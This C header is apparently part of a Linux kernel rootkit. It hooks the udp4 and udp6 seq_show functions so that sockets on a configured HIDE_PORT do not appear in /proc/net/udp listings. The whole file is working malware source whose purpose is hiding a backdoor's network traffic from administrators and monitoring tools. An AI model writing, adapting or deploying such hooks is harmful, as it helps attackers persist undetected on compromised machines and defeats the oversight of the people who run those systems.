#ifndef UDPX_SEQ_SHOW_H
#define UDPX_SEQ_SHOW_H
#include "../config.h"

static asmlinkage int(*original_udp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int udp4_seq_show_hook(struct seq_file *seq, void *v) {
    struct sock *sk = v;

    if (sk != (struct sock *)0x1 && sk->sk_num == HIDE_PORT) {
        return 0;
    }

    return original_udp4_seq_show(seq, v);
}

static asmlinkage int(*original_udp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int udp6_seq_show_hook(struct seq_file *seq, void *v) {
    struct sock *sk = v;

    if (sk != (struct sock *)0x1 && sk->sk_num == HIDE_PORT) {
        return 0;
    }

    return original_udp6_seq_show(seq, v);
}

#endif // !UDPX_SEQ_SHOW_H